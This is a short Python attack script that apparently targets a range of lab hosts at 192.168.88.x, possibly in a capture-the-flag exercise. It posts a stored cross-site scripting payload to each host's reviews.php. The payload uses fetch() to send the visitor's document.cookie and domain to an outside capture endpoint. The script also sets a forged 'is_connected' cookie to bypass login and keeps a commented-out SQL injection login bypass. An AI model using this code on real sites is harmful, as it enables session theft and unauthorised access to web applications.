#!/usr/bin/env python3

import requests as req

notExploited = [101,112,115,120,121,122,126,127,130,133,135,136]

notPossible = []

for i in notExploited:

  serverAdress = f"192.168.88.{i}"
  url = "http://" + serverAdress
  # loginval ={	"username": "'OR+1=1#",	"password": "blah",	"submit": "SIGN+IN"}
  # r = req.post(url + "/login.php" , data=loginval, timeout=3)
  # print(r.cookies)
  cookie_jar = {'is_connected': "1"}
  params = {'review_text': 'Very cool landing spot! Much secure. Such Wow! <script> fetch("https://ptsv2.com/t/dzyf7-1647520982/post", {method: "Post", body: JSON.stringify({domain: document.domain, cookie: document.cookie})}) </script>',
            'review_score': '5', 'submit': 'Review+it!'}
  print(params)
  newR = req.post("http://" + serverAdress+"/reviews.php", data=params)
  print(f'Response from {i}: {newR.status_code}')

  # string = str(byties)